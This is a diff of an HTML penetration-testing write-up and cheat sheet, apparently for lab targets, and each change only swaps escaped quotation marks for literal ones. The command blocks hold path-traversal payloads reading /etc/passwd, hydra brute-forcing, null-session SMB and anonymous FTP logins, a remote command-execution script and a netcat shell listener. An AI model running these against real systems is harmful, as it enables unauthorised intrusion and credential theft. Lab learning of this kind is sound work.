-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cmd /c dir /b C:\Users\chris\AppData\Local\Temp\proof_out.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cmd /c dir /b C:\Users\chris\AppData\Local\Temp\proof_out.txt 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">File Not Found</span></pre></div>
 <p><code>File Not Found</code> is the correct answer here, and it is the same string an empty directory produces —
@@ -1530,11 +1530,11 @@ which is precisely why the verification has to name the file rather than a direc
 <p>The SYSTEM shell on port 4448 is closed by killing the listener, which terminates the <code>cmd.exe</code>
 holding the connection:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>pkill<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;nc -lvnp 4448&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>pkill<span class="w"> </span>-f<span class="w"> </span><span class="s2">"nc -lvnp 4448"</span>
 </pre></div>
 <h3>7.2 Close listeners</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>pkill<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;nc -lvnp&quot;</span>
-ss<span class="w"> </span>-ltnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;:44(4[0-9])&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>pkill<span class="w"> </span>-f<span class="w"> </span><span class="s2">"nc -lvnp"</span>
+ss<span class="w"> </span>-ltnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">':44(4[0-9])'</span>
 </pre></div>
 <p>No process survived the engagement: GodPotato's children were started by <code>CreateProcessAsUser</code> and
 died with their parent shell, and no scheduled task, service or Run key was created. There is nothing
@@ -1644,7 +1644,7 @@ this version?" Version CVEs come last — most boxes are misconfigured, not unpa
 </pre></div>
 <p>If <code>161/udp</code> is open:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 </pre></div>
 <p>Then, on success, always:</p>
@@ -1661,7 +1661,7 @@ Descriptions are written for an internal audience and routinely name accounts an
 <h4>HTTP/HTTPS</h4>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
 <span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
 <span class="k">done</span>
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
@@ -1672,7 +1672,7 @@ feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class=
 <li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
 </ul>
 <h4>FTP</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
 </pre></div>
 <p>Try the account name as the password. Check for key material, configs, and backups in the data
@@ -1682,8 +1682,8 @@ directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> ac
 ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
 </pre></div>
 <h4>SMB</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
 nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 </pre></div>
 <hr />
@@ -1696,7 +1696,7 @@ escalation path depends on it.</p>
 <hr />
 <h3>Phase 5 — Local enumeration (Linux)</h3>
 <p>Send one script over one connection and read one report:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <p>Checklist, in the order that finds things:</p>
 <table>
@@ -1766,8 +1766,8 @@ escalation path depends on it.</p>
 <h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
 </pre></div>
 <p>What you are looking for, in priority order:</p>
 <ol>
@@ -1841,13 +1841,13 @@ nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </spa
 nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
 
 <span class="c1">## live hosts</span>
-nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
 </pre></div>
 <hr />
 <h3>SNMP</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
 <span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 
 <span class="c1">## full walk to a file, then grep it</span>
@@ -1860,7 +1860,7 @@ snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </
 snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
 
 <span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
 
 <span class="c1">## bulk walk when v1 is slow</span>
 snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
@@ -1868,27 +1868,27 @@ snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w
 <hr />
 <h3>Web</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
-curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
 
 <span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
 
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
 
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
 </pre></div>
 <hr />
 <h3>FTP</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
 
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
 
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
 </pre></div>
 <hr />
 <h3>SSH</h3>
@@ -1897,29 +1897,29 @@ curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>
 <span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
 ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
-sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
 <span class="c1">## run a whole enumeration script in one connection</span>
-ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <hr />
 <h3>SMB</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
 </pre></div>
 <hr />
 <h3>Linux local enumeration</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
 
 <span class="c1">## SUID without tripling the output on snap</span>
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
 
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
 getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
 ss<span class="w"> </span>-tlnp
@@ -1928,10 +1928,10 @@ find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </spa
 </pre></div>
 <hr />
 <h3>Binary analysis</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
